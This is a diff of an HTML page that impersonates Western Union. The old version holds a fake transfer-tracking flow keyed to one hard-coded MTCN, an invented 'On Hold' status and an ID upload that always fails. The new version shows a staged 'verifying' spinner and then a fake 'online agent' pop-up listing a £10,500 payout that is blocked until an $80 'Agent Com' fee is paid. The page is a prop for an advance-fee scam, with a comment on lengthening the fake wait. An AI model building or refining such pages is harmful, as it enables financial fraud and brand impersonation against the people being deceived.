@@ -3,505 +3,239 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Track a Transfer | Western Union</title>
+    <title>Transfer Management | Western Union</title>
     <style>
         :root {
+            --wu-blue: #0055a5;
             --wu-yellow: #ffda00;
             --wu-black: #000000;
-            --wu-blue: #0055a5;
             --wu-grey: #666666;
-            --wu-light-grey: #f5f5f5;
         }
 
         body {
-            font-family: 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
             margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            color: var(--wu-black);
+            background: #fff;
         }
 
-        /* Header */
-        .header {
-            background-color: var(--wu-black);
-            padding: 16px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            height: 60px; /* Fixed height for consistency */
-        }
-
-        .header-logo {
-            height: 40px; /* Adjusted for PNG image */
-            width: auto;
-            object-fit: contain;
-        }
-
-        .menu-button {
-            position: absolute;
-            right: 16px;
-            background-color: transparent;
-            border: 1px solid #fff;
-            color: #fff;
-            padding: 8px 12px;
-            font-size: 14px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        /* Banner */
-        .banner {
-            background-color: #fff;
-            padding: 16px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .banner img {
-            height: 60px;
-            margin-right: 16px;
-        }
-
-        .banner-text {
-            font-size: 14px;
-            line-height: 1.4;
-        }
-
-        .banner-text a {
-            color: var(--wu-blue);
-            text-decoration: none;
-        }
-
-        /* Main Content */
-        .main-content {
-            padding: 24px 16px;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 24px;
-        }
-
-        .language-selector {
-            display: flex;
-            justify-content: flex-end;
-            margin-bottom: 16px;
-            font-size: 14px;
-            color: var(--wu-blue);
-            cursor: pointer;
-        }
-
-        .tabs {
-            display: flex;
-            border-bottom: 2px solid #e0e0e0;
-            margin-bottom: 24px;
-        }
-
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 12px 0;
-            font-size: 16px;
-            color: var(--wu-grey);
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-        }
-
-        .tab.active {
-            color: var(--wu-black);
-            border-bottom-color: var(--wu-blue);
-            font-weight: 500;
-        }
-
-        .tab-icon {
-            margin-right: 8px;
-        }
-
-        .input-label {
-            font-size: 16px;
-            margin-bottom: 16px;
-            display: block;
-        }
-
-        /* MTCN Input Styling */
-        .mtcn-input-container {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 32px;
-            gap: 4px; /* Slight gap between boxes */
-        }
-
-        .mtcn-box {
-            width: 100%; /* Flexible width */
-            max-width: 40px;
-            height: 40px;
-            border: none;
-            border-bottom: 1px solid #ccc;
-            text-align: center;
-            font-size: 18px;
-            padding: 0;
-            border-radius: 0;
-            background: transparent;
-        }
-
-        .mtcn-box:focus {
-            outline: none;
-            border-bottom: 2px solid var(--wu-blue);
-        }
-
-        .continue-button {
-            width: 100%;
-            padding: 16px;
-            background-color: var(--wu-blue);
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .continue-button:hover {
-            background-color: #004488;
-        }
-
-        .dont-know-link {
-            display: block;
-            text-align: center;
-            margin-top: 16px;
-            color: var(--wu-blue);
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        /* Footer */
-        .footer {
-            padding: 24px 16px;
-            background-color: #fff;
-            border-top: 1px solid #e0e0e0;
-            font-size: 12px;
-            color: var(--wu-grey);
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-bottom: 24px;
-        }
-
-        .footer-links a {
-            color: var(--wu-grey);
-            text-decoration: none;
-            margin: 0 8px 8px 0;
-        }
-
-        .footer-text {
-            text-align: center;
-            line-height: 1.5;
-        }
-
-        /* Spinner Overlay */
-        .spinner-container {
+        /* Full Screen Spinner Container */
+        #loading-overlay {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        .spinner-logo {
-            height: 60px;
-            width: auto;
-            margin-bottom: 20px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .spinner-text {
-            font-size: 16px;
-            color: var(--wu-black);
-            margin-top: 16px;
-        }
-
-        /* Transcript Page */
-        .transcript-page {
-            display: none;
-            padding: 24px 16px;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .transcript-header {
-            border-bottom: 1px solid #ccc;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-
-        .transcript-item {
-            padding: 16px;
-            border-left: 4px solid #e0e0e0;
-            margin-bottom: 16px;
-            background: #f9f9f9;
-        }
-
-        .transcript-item.active {
-            border-left-color: var(--wu-blue);
-            background: #f0f7ff;
-        }
-
-        .transcript-status {
-            font-weight: 500;
-            margin-bottom: 4px;
-            font-size: 16px;
-        }
-
-        .transcript-date {
-            font-size: 14px;
-            color: var(--wu-grey);
-        }
-
-        /* ID Upload Page */
-        .id-upload-page {
-            display: none;
-            padding: 24px 16px;
-            text-align: center;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .upload-options {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 32px 0;
-        }
-
-        .upload-button {
-            display: flex;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #ffffff;
+            z-index: 9999;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 24px;
-            border: 2px dashed #ccc;
-            border-radius: 8px;
-            cursor: pointer;
+        }
+
+        /* Logo in the middle of spinner */
+        .spinner-wrapper {
+            position: relative;
             width: 120px;
-            transition: all 0.2s;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .upload-button:hover {
-            border-color: var(--wu-blue);
-            background-color: #f0f7ff;
+        .spinner-wrapper img {
+            width: 60px;
+            height: auto;
+            position: absolute;
+            z-index: 2;
         }
 
-        .upload-icon {
-            font-size: 32px;
-            margin-bottom: 8px;
-            color: var(--wu-blue);
+        .loader-ring {
+            width: 100px;
+            height: 100px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--wu-blue);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
         }
 
-        .error-message {
-            display: none;
-            color: #d32f2f;
-            background-color: #fdecea;
-            padding: 16px;
-            border: 1px solid #f5c6cb;
-            border-radius: 4px;
-            margin-top: 24px;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-text {
+            margin-top: 25px;
+            font-size: 18px;
             font-weight: 500;
+            color: var(--wu-black);
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        /* Agent Modal Pop-up */
+        .modal-bg {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .agent-modal {
+            background: #fff;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+
+        .modal-header {
+            background: var(--wu-black);
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .modal-content {
+            padding: 25px;
+        }
+
+        .agent-status {
+            color: #2e7d32;
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 15px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
+
+        .row.total {
+            border-bottom: none;
+            font-weight: bold;
+            font-size: 18px;
+            margin-top: 15px;
+        }
+
+        .agent-com {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            background: #ccc;
+            color: #777;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: not-allowed;
+            font-size: 16px;
+        }
+
+        .error-note {
+            color: #d32f2f;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* Placeholder for your actual UI button to trigger this */
+        .trigger-btn {
+            padding: 15px 30px;
+            background: var(--wu-blue);
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            margin: 50px;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="Western Union" class="header-logo">
-        <button class="menu-button">Menu</button>
+    <div style="text-align: center;">
+        <button class="trigger-btn" onclick="startVerification()">Submit ID for Verification</button>
     </div>
 
-    <div class="banner">
-        <img src="https://www.westernunion.com/content/dam/wu/images/wu-prepaid-card-visa.png" alt="WU Prepaid Card">
-        <div class="banner-text">
-            Skip the line and redirect your money transfer now to our prepaid card. $0 fees* for a limited time. <a href="#">Learn more</a>
+    <div id="loading-overlay">
+        <div class="spinner-wrapper">
+            <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="Logo">
+            <div class="loader-ring"></div>
         </div>
+        <div class="loading-text" id="load-msg">Initializing: Verifying ID...</div>
     </div>
 
-    <div class="main-content" id="tracking-page">
-        <div class="language-selector">
-            English/United States
-        </div>
-
-        <h1>Track a Transfer</h1>
-
-        <div class="tabs">
-            <div class="tab active">
-                <span class="tab-icon">↑</span> I'm the sender
+    <div class="modal-bg" id="agent-modal-bg">
+        <div class="agent-modal">
+            <div class="modal-header">
+                WESTERN UNION ONLINE AGENT
             </div>
-            <div class="tab">
-                <span class="tab-icon">↓</span> I'm the receiver
+            <div class="modal-content">
+                <div class="agent-status">
+                    <span style="height: 10px; width: 10px; background: #2e7d32; border-radius: 50%;"></span>
+                    Agent Connected - Session Active
+                </div>
+                
+                <div class="row">
+                    <span>Transfer Amount:</span>
+                    <span>£10,500.00</span>
+                </div>
+                <div class="row">
+                    <span>Bonus:</span>
+                    <span>£500.00</span>
+                </div>
+                <div class="row">
+                    <span>Agent Com:</span>
+                    <span class="agent-com">$80.00</span>
+                </div>
+                
+                <div class="row total">
+                    <span>Total Payout:</span>
+                    <span>£11,000.00</span>
+                </div>
+
+                <button class="continue-btn">Continue</button>
+                <div class="error-note">Payment has not been confirmed. Action Blocked.</div>
             </div>
-        </div>
-
-        <label class="input-label">Please enter your 12-digit tracking number (MTCN).</label>
-
-        <div class="mtcn-input-container" id="mtcn-container">
-            </div>
-
-        <button class="continue-button" onclick="checkMTCN()">Continue</button>
-
-        <a href="#" class="dont-know-link">Don't know the MTCN?</a>
-    </div>
-
-    <div class="spinner-container" id="spinner">
-        <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="Loading..." class="spinner-logo">
-        <div class="spinner-text">Retrieving transfer details...</div>
-    </div>
-
-    <div class="transcript-page" id="transcript-page">
-        <h1 class="transcript-header">Transfer Status</h1>
-        <div class="transcript-item">
-            <div class="transcript-status">Money Sent</div>
-            <div class="transcript-date">October 26, 2023 - 10:15 AM</div>
-        </div>
-        <div class="transcript-item">
-            <div class="transcript-status">In Progress</div>
-            <div class="transcript-date">October 26, 2023 - 10:30 AM</div>
-        </div>
-        <div class="transcript-item active">
-            <div class="transcript-status" style="color: var(--wu-blue);">On Hold - Action Required</div>
-            <div class="transcript-date">October 26, 2023 - 11:00 AM</div>
-            <div style="font-size: 14px; margin-top: 5px; color: #d32f2f;">Verification pending</div>
-        </div>
-    </div>
-
-    <div class="id-upload-page" id="id-upload-page">
-        <h1>Verify Your Identity</h1>
-        <p>To release this transfer, we require a valid government-issued ID for verification.</p>
-
-        <div class="upload-options">
-            <label class="upload-button">
-                <span class="upload-icon">🖼️</span>
-                <span>Gallery</span>
-                <input type="file" accept="image/*" style="display: none;" onchange="handleFileUpload()">
-            </label>
-            <label class="upload-button">
-                <span class="upload-icon">📷</span>
-                <span>Camera</span>
-                <input type="file" accept="image/*" capture="environment" style="display: none;" onchange="handleFileUpload()">
-            </label>
-        </div>
-
-        <div class="error-message" id="error-message">
-            <strong>Verification Failed:</strong> ID not accepted. Please ensure the image is clear and try again.
-        </div>
-    </div>
-
-    <div class="footer">
-        <div class="footer-links">
-            <a href="#">Home</a> | <a href="#">About us</a> | <a href="#">Contact us</a> | <a href="#">Refer a Friend</a> | <a href="#">Blog</a> | <a href="#">Help</a> | <a href="#">Fraud awareness</a> | <a href="#">Report a security bug</a> | <a href="#">Investor relations</a> | <a href="#">Careers</a> | <a href="#">Western Union Foundation</a> | <a href="#">News</a> | <a href="#">Become an agent</a> | <a href="#">Payment solutions</a> | <a href="#">State licensing</a> | <a href="#">Law enforcement subpoena information</a> | <a href="#">Terms and Conditions</a> | <a href="#">Online Privacy Statement</a> | <a href="#">Sitemap</a> | <a href="#">Cookie Information</a> | <a href="#">Accessibility Statement</a> | <a href="#">How to find your WU tracking number</a> | <a href="#">Send money with confidence</a>
-        </div>
-        <div class="footer-text">
-            From 5/24-11/24, no fees for card purchase, card load and per transaction. Other fees apply, see Cardholder agreement for details. Western Union Prepaid Visa(R) Card is issued by Pathward(R), N.A. Member FDIC, pursuant to a license from Visa U.S.A. Inc. Once registered, card can be used anywhere Visa debit cards are accepted.
         </div>
     </div>
 
     <script>
-        // Generate 12 MTCN input boxes dynamically
-        const mtcnContainer = document.getElementById('mtcn-container');
-        for (let i = 0; i < 12; i++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.inputMode = 'numeric'; // Brings up numeric keypad on mobile
-            input.pattern = '[0-9]*';
-            input.className = 'mtcn-box';
+        function startVerification() {
+            const overlay = document.getElementById('loading-overlay');
+            const msg = document.getElementById('load-msg');
+            const modal = document.getElementById('agent-modal-bg');
             
-            // Auto-focus next input
-            input.oninput = function() {
-                this.value = this.value.replace(/[^0-9]/g, ''); // Ensure only numbers
-                if (this.value.length === 1) {
-                    const next = this.nextElementSibling;
-                    if (next) next.focus();
-                }
-            };
+            // Show the loading screen
+            overlay.style.display = 'flex';
 
-            // Backspace navigation
-            input.onkeydown = function(e) {
-                if (e.key === 'Backspace' && this.value.length === 0) {
-                    const prev = this.previousElementSibling;
-                    if (prev) prev.focus();
-                }
-            };
-            mtcnContainer.appendChild(input);
-        }
+            // Timing variables (in milliseconds)
+            const VERIFY_TIME = 5000; // Set to 5000 for demo, use 300000 for 5 mins
+            const CONNECT_TIME = 3000; // Time for the "Connecting" phase
 
-        // Logic for checking the specific MTCN
-        function checkMTCN() {
-            const inputs = document.querySelectorAll('.mtcn-box');
-            let mtcn = '';
-            inputs.forEach(input => mtcn += input.value);
-
-            // Specific 12-digit code check
-            if (mtcn === '243567183900') {
-                // 1. Hide tracking input
-                document.getElementById('tracking-page').style.display = 'none';
-                
-                // 2. Show Spinner
-                document.getElementById('spinner').style.display = 'flex';
-
-                // 3. Wait 2.5 seconds, then show Transcript
-                setTimeout(() => {
-                    document.getElementById('spinner').style.display = 'none';
-                    document.getElementById('transcript-page').style.display = 'block';
-
-                    // 4. Wait 3 seconds, then show ID Upload
-                    setTimeout(() => {
-                        document.getElementById('transcript-page').style.display = 'none';
-                        document.getElementById('id-upload-page').style.display = 'block';
-                    }, 3000);
-                }, 2500);
-            } else {
-                alert('We couldn\'t find a transfer with that MTCN. Please check the number and try again.');
-            }
-        }
-
-        // Logic for handling file upload simulation
-        function handleFileUpload() {
-            // Show loading state or processing if desired, but request asked for immediate error
-            const errorMessage = document.getElementById('error-message');
-            errorMessage.style.display = 'block';
-
-            // Wait 3 seconds showing the error, then reset to home
+            // Phase 1: Verifying
             setTimeout(() => {
-                document.getElementById('id-upload-page').style.display = 'none';
-                errorMessage.style.display = 'none';
+                // Phase 2: Connecting to Agent
+                msg.innerText = "Connecting you with a Western Union online agent...";
                 
-                // Reset inputs and show home
-                const inputs = document.querySelectorAll('.mtcn-box');
-                inputs.forEach(input => input.value = '');
-                document.getElementById('tracking-page').style.display = 'block';
-                inputs[0].focus();
-            }, 3000);
+                setTimeout(() => {
+                    // Phase 3: Show Pop-up
+                    overlay.style.display = 'none';
+                    modal.style.display = 'flex';
+                }, CONNECT_TIME);
+
+            }, VERIFY_TIME);
         }
     </script>
-
 </body>
 </html>
